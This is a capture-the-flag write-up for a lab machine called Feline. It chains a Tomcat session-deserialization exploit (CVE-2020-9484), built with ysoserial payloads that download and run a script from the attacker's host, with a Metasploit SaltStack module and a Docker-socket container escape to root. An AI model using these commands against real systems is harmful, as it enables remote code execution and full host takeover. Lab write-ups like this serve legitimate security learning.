# Feline

### Initial Recon 
From the nmap scan we get two ports: 22 (SSH) and 8080 (Tomcat 9.0.27).

### Getting the foothold
There are various exploits on the Tomcat 9.0.27 but the only one that seems rezonable is SESSION deserialization (CVE-2020-9484). But for this one we need to meet three things:
- The PersistentManager is enabled and it’s using a FileStore ( no clue what this is ).
- The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded.
- There are gadgets in the classpath that can be used for a Java deserialization attack (still no clue).


With this said, it will be a long shot to get RCE. But the most important one is that we can upload files. We still don't know the path. In order to make it work I managed to throw an error when leaving the filename empty ( filenname ="" ) which disclosed the path `opt/samples/uploads/`. So now we need to do 4 things: 
- Use ysoserial to get a request from remote to attack that will later require the shell `java -jar /opt/tools/ysoserial.jar CommonsCollections5 "curl http://10.10.14.26/file.py -o /tmp/file.py" > shell.session`.
- Use ysoserial to get the file just downloaded to be executed `java -jar /opt/tools/ysoserial.jar CommonsCollections5 "python3 /tmp/file.py"> exploit.session`
- Manipulate the Cookie that manages the session to execute the first payload ( in order to download the file ). `JSESSIONID=../../../../../../opt/samples/uploads/shell`.
- Execute the second file to trigger the shell `JSESSIONID=../../../../../../opt/samples/uploads/execute`.

Because it's a long process and it can be painfull sometimes I wrote a script that automates this. You can just change the IP adresses and run the `./pwnUser.py` 

### Heading to root 
First we see all the listening ports `netstat -tulpn`. Here we do see the 4505 and 4506. A quick SSH portfowarding 
`ssh -R 4506:127.0.0.1:4506 zabogdan@10.10.14.26` to get access to scan the port. 

Running nmap we end up with `ZeroMQ ZTMP 2.0`.  There is a METASPLOIT module in order to exploit this `linux/misc/saltstack_salt_unauth_rce`. Switch to bash using `execute -f /bin/bash -i -H`.

Now that we are in the docker container we see that in `.bash_history` has something interesting `curl -s --unix-socket /var/run/docker.sock http://localhost/images/json`. From here we get the intel that this image is called `sandbox`.

We need to upload the docker binary. We go back on the shell from tomcat user and start a webserver in the `/usr/bin` directory to upload the docker binary.
Heading back to the container we can finally run the command `docker run -v /:/mnt --rm -it sandbox chroot /mnt bash` and get the root flag. 

### Articles 
-> https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
